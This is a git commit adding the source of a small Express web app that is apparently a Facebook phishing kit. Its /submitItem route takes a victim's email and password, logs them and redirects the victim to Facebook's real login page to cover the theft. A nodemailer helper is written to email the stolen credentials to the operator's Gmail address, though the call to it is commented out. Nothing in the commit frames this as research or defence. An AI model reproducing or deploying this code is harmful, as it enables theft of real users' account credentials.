254a01cb3639ceef4f0db3aad442f4446c6fc2df
fikayo <fikayoadele@gmail.com>
2024-06-20 07:31:31 +0100

    final

---
+++ src/index.js
@@ -0,0 +1,60 @@
+const express = require('express')
+const path = require('path')
+const app = express()
+const port = 3000
+const nodemailer = require('nodemailer')
+const bodyParser = require('body-parser')
+require('dotenv').config();
+
+
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'));
+
+const sendPayload = (email,payload) => {   
+    
+    let transporter = nodemailer.createTransport({
+      service: 'gmail',
+      host: 'smtp.gmail.com',
+      port: 465,
+      secure: true,
+      auth: {
+        user: process.env.EMAIL,
+        pass: process.env.EMAIL_PASSWORD,
+      },
+    });
+  
+    let mailOptions = {
+      from: process.env.EMAIL,
+      to: email,
+      subject: 'users details',
+      text: `here is the users details: ${payload}`,
+    };
+  
+    transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+          logger.error('Error sending email:', error);
+        } else {
+          logger.info('Email sent:', info.response)
+        }
+      });
+  
+  }
+
+  app.use(express.json());
+  app.use(bodyParser.urlencoded({ extended: true }));
+app.get('/', (req, res) => {
+    res.render('pages/index')
+})
+
+app.post('/submitItem',(req, res) => {
+    const {email,pass} = req.body
+    console.log(email,pass)
+    res.redirect('https://en-gb.facebook.com/login.php/')
+    const payload = `email: ${email} : password: ${pass}`
+    console.log(`user payload ${payload}` )
+    // sendPayload(process.env.EMAIL,payload)
+})
+
+app.listen(port,()=>{
+    console.log(`app listening on ${port}`);
+})
